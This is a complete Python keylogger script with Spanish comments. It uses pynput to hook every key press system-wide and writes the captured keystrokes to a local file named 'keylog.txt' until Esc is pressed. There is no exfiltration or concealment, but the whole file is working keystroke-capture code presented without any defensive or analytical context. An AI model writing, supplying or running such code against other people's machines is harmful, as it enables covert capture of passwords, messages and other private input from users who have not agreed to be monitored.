from pynput.keyboard import Key, Listener

# Lista para almacenar las teclas presionadas
keys = []

# Función que se ejecuta cada vez que se presiona una tecla
def presionar_tecla(key):
    # Si la tecla presionada es la tecla espacio, agrega un espacio a la lista 'keys'
    if key == Key.space:
        keys.append(' ')
    else:
        # De lo contrario, agrega la tecla presionada a la lista 'keys' como una cadena de texto
        keys.append(str(key).replace("'", ""))
    # Llama a la función para escribir las teclas en un archivo
    convertir_string(keys)

# Función para escribir las teclas almacenadas en la lista 'keys' en un archivo
def convertir_string(keys):
    # Abre (o crea) el archivo 'keylog.txt' sobreescribiendo el archivo cada vez que es ejecutado por la (w)
    with open('keylog.txt', 'w') as logfile:
        # Escribe cada tecla de la lista 'keys' en el archivo
        for key in keys:
            logfile.write(key)

# Función que se ejecuta cada vez que se suelta una tecla
def soltar_tecla(key):
    # Si la tecla soltada es la tecla 'esc', retorna False para detener el listener
    if key == Key.esc:
        return False

# Inicializa y comienza el listener que escucha las teclas presionadas y soltadas
with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()